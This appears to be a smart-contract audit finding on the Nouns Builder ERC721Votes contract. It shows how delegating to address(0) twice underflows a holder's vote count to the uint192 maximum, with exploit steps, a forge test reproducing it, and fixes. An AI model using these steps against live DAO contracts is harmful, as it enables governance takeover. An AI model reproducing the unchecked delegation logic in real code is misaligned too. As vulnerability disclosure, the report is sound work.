# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/lib/token/ERC721Votes.sol#L179-L190   # Vulnerability details  ## Impact Assuming an existing bug in the `_delegate` function is fixed (see my previous issue submission titled "Delegating votes leaves the token owner with votes while giving the delegate additional votes"): if a user delegates to address(0) that vote gets lost.  ## Proof of Concept  Assuming the `_delegate` function gets patched by changing: `address prevDelegate = delegation[_from];` to `address prevDelegate = delegates(_from);`  The steps to be taken:  1. User (U) gets one NFT (e.g by winning the auction)  a. votes(U) = 1 2. U delegates to address(0) // prevDelegate is U, so votes(U)--  a. votes(U) = 0, votes(address(0)) = 0 3. U delegates to address(0) // prevDelegate is U, so votes(U)--  a. votes(U) = 2^192 - 1  Below is a forge test showing the issue:  ``` // SPDX-License-Identifier: MIT pragma solidity 0.8.15;  import { NounsBuilderTest } from "../utils/NounsBuilderTest.sol"; import { TokenTypesV1 } from "../../src/token/types/TokenTypesV1.sol";  contract TokenTest is NounsBuilderTest, TokenTypesV1 {     address user1 = address(0x1001);     address delegate1 = address(0x2001);     address delegate2 = address(0x2002);      function setUp() public virtual override {         super.setUp();          vm.label(user1, "user1");         vm.label(delegate1, "delegate1");         deployMock();     }      function setMockFounderParams() internal virtual override {         address[] memory wallets = new address[](1);         uint256[] memory percents = new uint256[](1);         uint256[] memory vestingEnds = new uint256[](1);          wallets[0] = founder;         percents[0] = 0;         vestingEnds[0] = 4 weeks;          setFounderParams(wallets, percents, vestingEnds);     }      function test_pown2() public {         // user1 gets one token         vm.startPrank(address(auction));         token.mint();         token.transferFrom(address(auction), user1, 0);         vm.stopPrank();          // user1 has 1 token & 1 vote         assertEq(token.balanceOf(user1), 1);         assertEq(token.getVotes(user1), 1);          vm.prank(user1);         token.delegate(address(0));         assertEq(token.getVotes(user1), 0);          vm.prank(user1);         token.delegate(address(0));         assertEq(token.getVotes(user1), type(uint192).max);     } } ```  ## Tools Used Manual review  ## Recommended Mitigation Steps Either: 1. Don't allow delegation to address(0) by adding a check or 2. If someone tries to delegate to address(0), delegate to the NFT owner instead
